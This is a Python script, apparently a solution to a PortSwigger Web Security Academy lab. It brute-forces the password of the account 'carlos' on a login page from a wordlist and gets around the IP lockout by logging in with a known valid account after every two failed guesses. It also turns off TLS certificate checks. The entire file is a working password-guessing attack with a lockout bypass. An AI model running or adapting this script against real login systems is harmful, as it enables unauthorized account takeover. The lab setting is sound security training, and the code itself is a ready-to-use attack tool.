import requests
import urllib3
from time import sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def passwords_list_generator():
    with open('passwords.txt','r') as list:
        for line in list:
            yield line.strip()

def reset_login_attempts(url):
    r = requests.post(url, data={'username':'wiener', 'password':'peter'}, verify=False, allow_redirects=False)
    return r.status_code == 302

def main():
    urlab = 'https://0ae800fa03672f378127938900a50026.web-security-academy.net/login'
    pass_generator = passwords_list_generator()
    reached_end = False
    raised_error = False
    while not reached_end and not raised_error:
        for _ in range(2):
            try:
                passwd = next(pass_generator)
            except StopIteration:
                print("Finished")
                reached_end = True
                break
            r = requests.post(urlab, data={'username':'carlos', 'password':f'{passwd}'}, verify=False, allow_redirects=False)
            if r.status_code == 302:
                print(f"Password found:{passwd}")
                return
            elif 'many' in r.text:
                 raised_error = True
                 print("Too many attempts raised")
                 print('waiting a minute')
                 sleep(1.5)
            else:
                print(f"{passwd} is incorrect")

        if reset_login_attempts(urlab):
            print("reseted login attempts")
        else:
            print("failed to reset login attempts")
            raised_error = True
            break
    
if __name__ == '__main__':
    main()